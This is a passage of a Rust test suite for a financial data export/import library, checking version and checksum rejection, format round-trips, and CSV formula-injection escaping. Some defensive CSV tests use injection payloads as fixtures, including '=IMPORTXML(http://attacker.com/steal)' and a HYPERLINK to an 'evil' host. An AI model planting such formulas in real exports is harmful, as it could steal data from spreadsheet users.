        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Binary);
        snapshot.header.version = MIN_SUPPORTED_VERSION.saturating_sub(1);
        snapshot.header.checksum = snapshot.compute_checksum().unwrap();
        let bytes = bincode::serialize(&snapshot).unwrap();
        assert_eq!(
            import_from_binary_untracked(&bytes).unwrap_err(),
            MigrationError::IncompatibleVersion {
                found: MIN_SUPPORTED_VERSION.saturating_sub(1),
                min: MIN_SUPPORTED_VERSION,
                max: SCHEMA_VERSION,
            }
        );
    }

    // Property 1: Fault Condition — Untested Rejection Paths Return Correct Error Variants
    // Validates: Requirements 1.1, 1.2, 1.3, 1.4, 1.5, 1.6
    //
    // Generates arbitrary strings that do NOT start with "enc:v1:" and are within the
    // pre-decode size limit. All such inputs must return Err(MigrationError::InvalidFormat(_)).
    // This covers empty, partial markers, wrong-cased markers, whitespace, and arbitrary
    // non-prefixed inputs in a single property sweep.
    fn proptest_invalid_prefix_strategy() -> impl proptest::strategy::Strategy<Value = String> {
        use proptest::strategy::Strategy;
        proptest::string::string_regex(".{0,100}")
            .unwrap()
            .prop_filter("must not start with enc:v1:", |s: &String| {
                !s.starts_with(ENCRYPTED_PAYLOAD_PREFIX_V1)
            })
            .prop_filter("must be within size limit", |s: &String| {
                s.len() <= MAX_ENCRYPTED_PAYLOAD_BYTES
            })
    }

    proptest::proptest! {
        #[test]
        fn test_enc_marker_fault_condition_exploration(s in proptest_invalid_prefix_strategy()) {
            let result = import_from_encrypted_payload(&s);
            proptest::prop_assert!(
                matches!(result, Err(MigrationError::InvalidFormat(_))),
                "expected InvalidFormat for input {:?}, got {:?}", s, result
            );
        }
    }

    // ==================== ROUND-TRIP TESTS ====================
    // These tests verify lossless export->import cycles for all formats.

    #[test]
    fn test_roundtrip_json_remittance_split_payload() {
        let original = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        let exported_bytes = export_to_json(&original).unwrap();
        let mut tracker = MigrationTracker::new();
        let imported = import_from_json(&exported_bytes, &mut tracker, 1_000).unwrap();

        // Verify payload equivalence
        assert_eq!(imported.payload, original.payload);
        assert_eq!(imported.header.format, original.header.format);
        assert!(imported.verify_checksum());
    }

    #[test]
    fn test_roundtrip_json_savings_goals_payload() {
        let goals = sample_goals_export(5);
        let original = ExportSnapshot::new(
            SnapshotPayload::SavingsGoals(goals.clone()),
            ExportFormat::Json,
        );
        let exported_bytes = export_to_json(&original).unwrap();
        let mut tracker = MigrationTracker::new();
        let imported = import_from_json(&exported_bytes, &mut tracker, 1_000).unwrap();

        // Verify payload equivalence
        assert_eq!(imported.payload, original.payload);
        assert_eq!(imported.header.checksum, original.header.checksum);
        assert!(imported.verify_checksum());
    }

    #[test]
    fn test_roundtrip_json_generic_payload() {
        let original = ExportSnapshot::new(sample_generic_payload(), ExportFormat::Json);
        let exported_bytes = export_to_json(&original).unwrap();
        let mut tracker = MigrationTracker::new();
        let imported = import_from_json(&exported_bytes, &mut tracker, 1_000).unwrap();

        // Verify payload equivalence
        assert_eq!(imported.payload, original.payload);
        assert_eq!(imported.header.checksum, original.header.checksum);
        assert!(imported.verify_checksum());
    }

    #[test]
    fn test_roundtrip_binary_remittance_split_payload() {
        let original = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Binary);
        let exported_bytes = export_to_binary(&original).unwrap();
        let mut tracker = MigrationTracker::new();
        let imported = import_from_binary(&exported_bytes, &mut tracker, 1_000).unwrap();

        // Verify payload equivalence
        assert_eq!(imported.payload, original.payload);
        assert_eq!(imported.header.format, original.header.format);
        assert!(imported.verify_checksum());
    }

    #[test]
    fn test_roundtrip_binary_savings_goals_payload() {
        let goals = sample_goals_export(3);
        let original = ExportSnapshot::new(
            SnapshotPayload::SavingsGoals(goals.clone()),
            ExportFormat::Binary,
        );
        let exported_bytes = export_to_binary(&original).unwrap();
        let mut tracker = MigrationTracker::new();
        let imported = import_from_binary(&exported_bytes, &mut tracker, 1_000).unwrap();

        // Verify payload equivalence
        assert_eq!(imported.payload, original.payload);
        assert_eq!(imported.header.checksum, original.header.checksum);
        assert!(imported.verify_checksum());
    }

    #[test]
    fn test_roundtrip_binary_generic_payload() {
        let original = ExportSnapshot::new(sample_generic_payload(), ExportFormat::Binary);
        let exported_bytes = export_to_binary(&original).unwrap();
        let mut tracker = MigrationTracker::new();
        let imported = import_from_binary(&exported_bytes, &mut tracker, 1_000).unwrap();

        // Verify payload equivalence
        assert_eq!(imported.payload, original.payload);
        assert_eq!(imported.header.checksum, original.header.checksum);
        assert!(imported.verify_checksum());
    }

    #[test]
    fn test_roundtrip_csv_savings_goals() {
        let payload = SavingsGoalsExport {
            next_id: 3,
            goals: vec![
                SavingsGoalExport {
                    id: 1,
                    owner: "owner1".into(),
                    name: "Goal 1".into(),
                    target_amount: 1_000,
                    current_amount: 500,
                    target_date: 2_000_000_000,
                    locked: false,
                },
                SavingsGoalExport {
                    id: 2,
                    owner: "owner2".into(),
                    name: "Goal 2".into(),
                    target_amount: 2_000,
                    current_amount: 1_500,
                    target_date: 2_000_000_001,
                    locked: true,
                },
            ],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();

        // Verify payload equivalence (goals should round-trip perfectly)
        assert_eq!(imported_goals.len(), payload.goals.len());
        for (i, goal) in imported_goals.iter().enumerate() {
            assert_eq!(goal.id, payload.goals[i].id);
            assert_eq!(goal.owner, payload.goals[i].owner);
            assert_eq!(goal.name, payload.goals[i].name);
            assert_eq!(goal.target_amount, payload.goals[i].target_amount);
            assert_eq!(goal.current_amount, payload.goals[i].current_amount);
            assert_eq!(goal.target_date, payload.goals[i].target_date);
            assert_eq!(goal.locked, payload.goals[i].locked);
        }
    }

    #[test]
    fn test_roundtrip_csv_with_unicode_names() {
        let payload = SavingsGoalsExport {
            next_id: 2,
            goals: vec![
                SavingsGoalExport {
                    id: 1,
                    owner: "用户1".into(),
                    name: "目标1 🎯".into(),
                    target_amount: 1_000,
                    current_amount: 100,
                    target_date: 2_000_000_000,
                    locked: false,
                },
                SavingsGoalExport {
                    id: 2,
                    owner: "ユーザー2".into(),
                    name: "Objectif 2 📊".into(),
                    target_amount: 2_000,
                    current_amount: 500,
                    target_date: 2_000_000_001,
                    locked: true,
                },
            ],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();

        // Verify unicode round-trips correctly
        assert_eq!(imported_goals[0].owner, "用户1");
        assert_eq!(imported_goals[0].name, "目标1 🎯");
        assert_eq!(imported_goals[1].owner, "ユーザー2");
        assert_eq!(imported_goals[1].name, "Objectif 2 📊");
    }

    #[test]
    fn test_roundtrip_csv_empty_payload() {
        let payload = SavingsGoalsExport {
            next_id: 0,
            goals: Vec::new(),
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();

        // Verify empty payload round-trips
        assert_eq!(imported_goals.len(), 0);
    }

    // ==================== CSV INJECTION SECURITY TESTS ====================
    // These tests verify that leading formula characters are escaped.

    #[test]
    fn test_csv_injection_prevention_equals_sign_in_name() {
        let payload = SavingsGoalsExport {
            next_id: 1,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "owner".into(),
                name: "=IMPORTXML(http://attacker.com/steal)".into(),
                target_amount: 1_000,
                current_amount: 100,
                target_date: 2_000_000_000,
                locked: false,
            }],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let csv_string = String::from_utf8_lossy(&exported_bytes);

        // Verify that the formula character is escaped with a leading quote
        assert!(
            csv_string.contains("'=IMPORTXML("),
            "CSV should escape = with leading quote"
        );
        assert!(
            !csv_string.contains(",=IMPORTXML("),
            "CSV should not contain unescaped formula"
        );
        assert!(
            !csv_string.starts_with("=IMPORTXML("),
            "CSV should not start with an unescaped formula"
        );
    }

    #[test]
    fn test_csv_injection_prevention_plus_sign_in_owner() {
        let payload = SavingsGoalsExport {
            next_id: 1,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "+1+1".into(),
                name: "Goal".into(),
                target_amount: 1_000,
                current_amount: 100,
                target_date: 2_000_000_000,
                locked: false,
            }],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let csv_string = String::from_utf8_lossy(&exported_bytes);

        // Verify that + is escaped
        assert!(
            csv_string.contains("'+1+1"),
            "CSV should escape + with leading quote"
        );
    }

    #[test]
    fn test_csv_injection_prevention_minus_sign_in_name() {
        let payload = SavingsGoalsExport {
            next_id: 1,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "owner".into(),
                name: "-2+3".into(),
                target_amount: 1_000,
                current_amount: 100,
                target_date: 2_000_000_000,
                locked: false,
            }],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let csv_string = String::from_utf8_lossy(&exported_bytes);

        // Verify that - is escaped
        assert!(
            csv_string.contains("'-2+3"),
            "CSV should escape - with leading quote"
        );
    }

    #[test]
    fn test_csv_injection_prevention_at_sign_in_owner() {
        let payload = SavingsGoalsExport {
            next_id: 1,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "@SUM(A1:A10)".into(),
                name: "Goal".into(),
                target_amount: 1_000,
                current_amount: 100,
                target_date: 2_000_000_000,
                locked: false,
            }],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let csv_string = String::from_utf8_lossy(&exported_bytes);

        // Verify that @ is escaped
        assert!(
            csv_string.contains("'@SUM"),
            "CSV should escape @ with leading quote"
        );
    }

    #[test]
    fn test_csv_injection_safe_normal_text_unmodified() {
        let payload = SavingsGoalsExport {
            next_id: 1,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "John Doe".into(),
                name: "Emergency Fund".into(),
                target_amount: 5_000,
                current_amount: 1_000,
                target_date: 2_000_000_000,
                locked: false,
            }],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let csv_string = String::from_utf8_lossy(&exported_bytes);

        // Verify that normal text is not escaped
        assert!(
            csv_string.contains("John Doe"),
            "Normal text should not be escaped"
        );
        assert!(
            csv_string.contains("Emergency Fund"),
            "Normal names should not be escaped"
        );
    }

    #[test]
    fn test_csv_injection_safe_numbers_unmodified() {
        let payload = SavingsGoalsExport {
            next_id: 1,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "owner".into(),
                name: "123456".into(),
                target_amount: 1_000,
                current_amount: 100,
                target_date: 2_000_000_000,
                locked: false,
            }],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let csv_string = String::from_utf8_lossy(&exported_bytes);

        // Verify that numeric strings are not escaped (they don't start with formula chars)
        assert!(
            csv_string.contains("123456"),
            "Numeric strings should not be escaped"
        );
    }

    #[test]
    fn test_csv_injection_prevention_multiple_goals_with_mixed_payloads() {
        let payload = SavingsGoalsExport {
            next_id: 5,
            goals: vec![
                SavingsGoalExport {
                    id: 1,
                    owner: "normal".into(),
                    name: "Safe Goal".into(),
                    target_amount: 1_000,
                    current_amount: 100,
                    target_date: 2_000_000_000,
                    locked: false,
                },
                SavingsGoalExport {
                    id: 2,
                    owner: "=EXPLOIT()".into(),
                    name: "Injected".into(),
                    target_amount: 2_000,
                    current_amount: 200,
                    target_date: 2_000_000_001,
                    locked: false,
                },
                SavingsGoalExport {
                    id: 3,
                    owner: "user".into(),
                    name: "+HYPERLINK(\"http://evil\",\"click\")".into(),
                    target_amount: 3_000,
                    current_amount: 300,
                    target_date: 2_000_000_002,
                    locked: true,
                },
                SavingsGoalExport {
                    id: 4,
                    owner: "-2".into(),
                    name: "Negative".into(),
                    target_amount: 4_000,
                    current_amount: 400,
                    target_date: 2_000_000_003,
                    locked: false,
                },
            ],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let csv_string = String::from_utf8_lossy(&exported_bytes);

        // Verify all injections are escaped
        assert!(
            csv_string.contains("'=EXPLOIT"),
            "Should escape = injections"
        );
        assert!(
            csv_string.contains("'+HYPERLINK"),
            "Should escape + injections"
        );
        assert!(csv_string.contains("'-2"), "Should escape - injections");
        // Verify safe content is preserved
        assert!(
            csv_string.contains("Safe Goal"),
            "Safe content should be preserved"
        );
    }

    #[test]
    fn test_csv_roundtrip_after_injection_escaping() {
        let payload = SavingsGoalsExport {
            next_id: 2,
            goals: vec![
                SavingsGoalExport {
                    id: 1,
                    owner: "=MALICIOUS".into(),
                    name: "Goal".into(),
                    target_amount: 1_000,
                    current_amount: 100,
                    target_date: 2_000_000_000,
                    locked: false,
                },
                SavingsGoalExport {
                    id: 2,
                    owner: "safe".into(),
                    name: "+FORMULA".into(),
                    target_amount: 2_000,
                    current_amount: 200,
                    target_date: 2_000_000_001,
                    locked: true,
                },
            ],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();

        // CSV import strips the exporter-added quote used for spreadsheet safety.
        assert_eq!(imported_goals[0].owner, "=MALICIOUS");
        assert_eq!(imported_goals[1].name, "+FORMULA");
    }

    #[test]
    fn test_import_from_json_rejects_incompatible_version_too_low() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        snapshot.header.version = MIN_SUPPORTED_VERSION - 1;
        let bytes = serde_json::to_vec(&snapshot).unwrap();
        let mut tracker = MigrationTracker::new();
        let result = import_from_json(&bytes, &mut tracker, 123_456);
        assert!(matches!(
            result.unwrap_err(),
            MigrationError::IncompatibleVersion {
                found: 0,
                min: 1,
                max: 1
            }
        ));
    }

    #[test]
    fn test_import_from_json_rejects_incompatible_version_too_high() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        snapshot.header.version = SCHEMA_VERSION + 1;
        let bytes = serde_json::to_vec(&snapshot).unwrap();
        let mut tracker = MigrationTracker::new();
        let result = import_from_json(&bytes, &mut tracker, 123_456);
        assert!(matches!(
            result.unwrap_err(),
            MigrationError::IncompatibleVersion {
                found: 2,
                min: 1,
                max: 1
            }
        ));
    }

    #[test]
    fn test_import_from_json_rejects_checksum_mismatch() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        snapshot.header.checksum = "invalid_checksum".into();
        let bytes = serde_json::to_vec(&snapshot).unwrap();
        let mut tracker = MigrationTracker::new();
        let result = import_from_json(&bytes, &mut tracker, 123_456);
        assert_eq!(result.unwrap_err(), MigrationError::ChecksumMismatch);
    }

    #[test]
    fn test_import_from_binary_rejects_incompatible_version_too_low() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Binary);
        snapshot.header.version = MIN_SUPPORTED_VERSION - 1;
        let bytes = bincode::serialize(&snapshot).unwrap();
        let mut tracker = MigrationTracker::new();
        let result = import_from_binary(&bytes, &mut tracker, 123_456);
        assert!(matches!(
            result.unwrap_err(),
            MigrationError::IncompatibleVersion {
                found: 0,
                min: 1,
                max: 1
            }
        ));
    }

    #[test]
    fn test_import_from_binary_rejects_incompatible_version_too_high() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Binary);
        snapshot.header.version = SCHEMA_VERSION + 1;
        let bytes = bincode::serialize(&snapshot).unwrap();
        let mut tracker = MigrationTracker::new();
        let result = import_from_binary(&bytes, &mut tracker, 123_456);
        assert!(matches!(
            result.unwrap_err(),
            MigrationError::IncompatibleVersion {
                found: 2,
                min: 1,
                max: 1
            }
        ));
    }

    #[test]
    fn test_import_from_binary_rejects_checksum_mismatch() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Binary);
        snapshot.header.checksum = "invalid_checksum".into();
        let bytes = bincode::serialize(&snapshot).unwrap();
        let mut tracker = MigrationTracker::new();
        let result = import_from_binary(&bytes, &mut tracker, 123_456);
        assert_eq!(result.unwrap_err(), MigrationError::ChecksumMismatch);
    }

    #[test]
    fn test_import_from_json_untracked_rejects_incompatible_version_too_low() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        snapshot.header.version = MIN_SUPPORTED_VERSION - 1;
        let bytes = serde_json::to_vec(&snapshot).unwrap();
        let result = import_from_json_untracked(&bytes);
        assert!(matches!(
            result.unwrap_err(),
            MigrationError::IncompatibleVersion {
                found: 0,
                min: 1,
                max: 1
            }
        ));
    }

    #[test]
    fn test_import_from_json_untracked_rejects_incompatible_version_too_high() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        snapshot.header.version = SCHEMA_VERSION + 1;
        let bytes = serde_json::to_vec(&snapshot).unwrap();
        let result = import_from_json_untracked(&bytes);
        assert!(matches!(
            result.unwrap_err(),
            MigrationError::IncompatibleVersion {
                found: 2,
                min: 1,
                max: 1
            }
        ));
    }

    #[test]
    fn test_import_from_json_untracked_rejects_checksum_mismatch() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Json);
        snapshot.header.checksum = "invalid_checksum".into();
        let bytes = serde_json::to_vec(&snapshot).unwrap();
        let result = import_from_json_untracked(&bytes);
        assert_eq!(result.unwrap_err(), MigrationError::ChecksumMismatch);
    }

    #[test]
    fn test_import_from_binary_untracked_rejects_incompatible_version_too_low() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Binary);
        snapshot.header.version = MIN_SUPPORTED_VERSION - 1;
        let bytes = bincode::serialize(&snapshot).unwrap();
        let result = import_from_binary_untracked(&bytes);
        assert!(matches!(
            result.unwrap_err(),
            MigrationError::IncompatibleVersion {
                found: 0,
                min: 1,
                max: 1
            }
        ));
    }

    #[test]
    fn test_import_from_binary_untracked_rejects_incompatible_version_too_high() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Binary);
        snapshot.header.version = SCHEMA_VERSION + 1;
        let bytes = bincode::serialize(&snapshot).unwrap();
        let result = import_from_binary_untracked(&bytes);
        assert!(matches!(
            result.unwrap_err(),
            MigrationError::IncompatibleVersion {
                found: 2,
                min: 1,
                max: 1
            }
        ));
    }

    #[test]
    fn test_import_from_binary_untracked_rejects_checksum_mismatch() {
        let mut snapshot = ExportSnapshot::new(sample_remittance_payload(), ExportFormat::Binary);
        snapshot.header.checksum = "invalid_checksum".into();
        let bytes = bincode::serialize(&snapshot).unwrap();
        let result = import_from_binary_untracked(&bytes);
        assert_eq!(result.unwrap_err(), MigrationError::ChecksumMismatch);
    }

    #[test]
    fn test_csv_roundtrip_with_commas_in_names() {
        let payload = SavingsGoalsExport {
            next_id: 2,
            goals: vec![
                SavingsGoalExport {
                    id: 1,
                    owner: "owner1".into(),
                    name: "Goal, with, commas".into(),
                    target_amount: 1_000,
                    current_amount: 500,
                    target_date: 2_000_000_000,
                    locked: false,
                },
                SavingsGoalExport {
                    id: 2,
                    owner: "owner,2".into(),
                    name: "Normal Goal".into(),
                    target_amount: 2_000,
                    current_amount: 1_500,
                    target_date: 2_000_000_001,
                    locked: true,
                },
            ],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();

        assert_eq!(imported_goals.len(), 2);
        assert_eq!(imported_goals[0].name, "Goal, with, commas");
        assert_eq!(imported_goals[1].owner, "owner,2");
    }

    #[test]
    fn test_csv_roundtrip_with_quotes_in_names() {
        let payload = SavingsGoalsExport {
            next_id: 2,
            goals: vec![
                SavingsGoalExport {
                    id: 1,
                    owner: "owner1".into(),
                    name: "Goal \"quoted\" text".into(),
                    target_amount: 1_000,
                    current_amount: 500,
                    target_date: 2_000_000_000,
                    locked: false,
                },
                SavingsGoalExport {
                    id: 2,
                    owner: "owner\"2".into(),
                    name: "Normal Goal".into(),
                    target_amount: 2_000,
                    current_amount: 1_500,
                    target_date: 2_000_000_001,
                    locked: true,
                },
            ],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();

        assert_eq!(imported_goals.len(), 2);
        assert_eq!(imported_goals[0].name, "Goal \"quoted\" text");
        assert_eq!(imported_goals[1].owner, "owner\"2");
    }

    #[test]
    fn test_csv_roundtrip_with_newlines_in_names() {
        let payload = SavingsGoalsExport {
            next_id: 1,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "owner1".into(),
                name: "Goal\nwith\nnewlines".into(),
                target_amount: 1_000,
                current_amount: 500,
                target_date: 2_000_000_000,
                locked: false,
            }],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();

        assert_eq!(imported_goals.len(), 1);
        assert_eq!(imported_goals[0].name, "Goal\nwith\nnewlines");
    }

    #[test]
    fn test_csv_roundtrip_with_zero_values() {
        let payload = SavingsGoalsExport {
            next_id: 1,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "owner1".into(),
                name: "Zero Goal".into(),
                target_amount: 0,
                current_amount: 0,
                target_date: 0,
                locked: false,
            }],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();

        assert_eq!(imported_goals.len(), 1);
        assert_eq!(imported_goals[0].target_amount, 0);
        assert_eq!(imported_goals[0].current_amount, 0);
        assert_eq!(imported_goals[0].target_date, 0);
    }

    #[test]
    fn test_csv_roundtrip_with_negative_amounts() {
        let payload = SavingsGoalsExport {
            next_id: 1,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "owner1".into(),
                name: "Negative Goal".into(),
                target_amount: -1_000,
                current_amount: -500,
                target_date: 2_000_000_000,
                locked: false,
            }],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();

        assert_eq!(imported_goals.len(), 1);
        assert_eq!(imported_goals[0].target_amount, -1_000);
        assert_eq!(imported_goals[0].current_amount, -500);
    }

    #[test]
    fn test_csv_roundtrip_with_large_numbers() {
        let payload = SavingsGoalsExport {
            next_id: 1,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "owner1".into(),
                name: "Large Goal".into(),
                target_amount: i64::MAX,
                current_amount: i64::MAX - 1,
                target_date: u64::MAX,
                locked: false,
            }],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();

        assert_eq!(imported_goals.len(), 1);
        assert_eq!(imported_goals[0].target_amount, i64::MAX);
        assert_eq!(imported_goals[0].current_amount, i64::MAX - 1);
        assert_eq!(imported_goals[0].target_date, u64::MAX);
    }

    #[test]
    fn test_csv_roundtrip_with_tab_characters() {
        let payload = SavingsGoalsExport {
            next_id: 1,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "owner\t1".into(),
                name: "Goal\twith\ttabs".into(),
                target_amount: 1_000,
                current_amount: 500,
                target_date: 2_000_000_000,
                locked: false,
            }],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();

        assert_eq!(imported_goals.len(), 1);
        assert_eq!(imported_goals[0].owner, "owner\t1");
        assert_eq!(imported_goals[0].name, "Goal\twith\ttabs");
    }

    #[test]
    fn test_csv_roundtrip_with_backslash_characters() {
        let payload = SavingsGoalsExport {
            next_id: 1,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "owner\\1".into(),
                name: "Goal\\with\\backslashes".into(),
                target_amount: 1_000,
                current_amount: 500,
                target_date: 2_000_000_000,
                locked: false,
            }],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();

        assert_eq!(imported_goals.len(), 1);
        assert_eq!(imported_goals[0].owner, "owner\\1");
        assert_eq!(imported_goals[0].name, "Goal\\with\\backslashes");
    }

    #[test]
    fn test_csv_injection_prevention_tab_character_in_owner() {
        let payload = SavingsGoalsExport {
            next_id: 1,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "\tSUM(A1:A10)".into(),
                name: "Goal".into(),
                target_amount: 1_000,
                current_amount: 100,
                target_date: 2_000_000_000,
                locked: false,
            }],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let csv_string = String::from_utf8_lossy(&exported_bytes);

        // Tab is not a formula injection character, so it should not be escaped
        assert!(
            csv_string.contains("\tSUM(A1:A10)"),
            "Tab should not be escaped"
        );
    }

    #[test]
    fn test_csv_injection_prevention_backslash_in_name() {
        let payload = SavingsGoalsExport {
            next_id: 1,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "owner".into(),
                name: "\\SUM(A1:A10)".into(),
                target_amount: 1_000,
                current_amount: 100,
                target_date: 2_000_000_000,
                locked: false,
            }],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let csv_string = String::from_utf8_lossy(&exported_bytes);

        // Backslash is not a formula injection character, so it should not be escaped
        assert!(
            csv_string.contains("\\SUM(A1:A10)"),
            "Backslash should not be escaped"
        );
    }

    #[test]
    fn test_csv_injection_prevention_pipe_character_in_owner() {
        let payload = SavingsGoalsExport {
            next_id: 1,
            goals: vec![SavingsGoalExport {
                id: 1,
                owner: "|SUM(A1:A10)".into(),
                name: "Goal".into(),
                target_amount: 1_000,
                current_amount: 100,
                target_date: 2_000_000_000,
                locked: false,
            }],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let csv_string = String::from_utf8_lossy(&exported_bytes);

        // Pipe is not a formula injection character, so it should not be escaped
        assert!(
            csv_string.contains("|SUM(A1:A10)"),
            "Pipe should not be escaped"
        );
    }

    #[test]
    fn test_csv_roundtrip_preserves_all_fields() {
        let payload = SavingsGoalsExport {
            next_id: 5,
            goals: vec![
                SavingsGoalExport {
                    id: 1,
                    owner: "owner1".into(),
                    name: "Goal 1".into(),
                    target_amount: 10_000,
                    current_amount: 5_000,
                    target_date: 1_700_000_000,
                    locked: false,
                },
                SavingsGoalExport {
                    id: 2,
                    owner: "owner2".into(),
                    name: "Goal 2".into(),
                    target_amount: 20_000,
                    current_amount: 15_000,
                    target_date: 1_800_000_000,
                    locked: true,
                },
                SavingsGoalExport {
                    id: 3,
                    owner: "owner3".into(),
                    name: "Goal 3".into(),
                    target_amount: 30_000,
                    current_amount: 0,
                    target_date: 1_900_000_000,
                    locked: false,
                },
            ],
        };

        let exported_bytes = export_to_csv(&payload).unwrap();
        let imported_goals = import_goals_from_csv(&exported_bytes).unwrap();

        assert_eq!(imported_goals.len(), 3);
        for (i, goal) in imported_goals.iter().enumerate() {
            assert_eq!(goal.id, payload.goals[i].id);
            assert_eq!(goal.owner, payload.goals[i].owner);
            assert_eq!(goal.name, payload.goals[i].name);
            assert_eq!(goal.target_amount, payload.goals[i].target_amount);
            assert_eq!(goal.current_amount, payload.goals[i].current_amount);
            assert_eq!(goal.target_date, payload.goals[i].target_date);
            assert_eq!(goal.locked, payload.goals[i].locked);
        }
    }
}
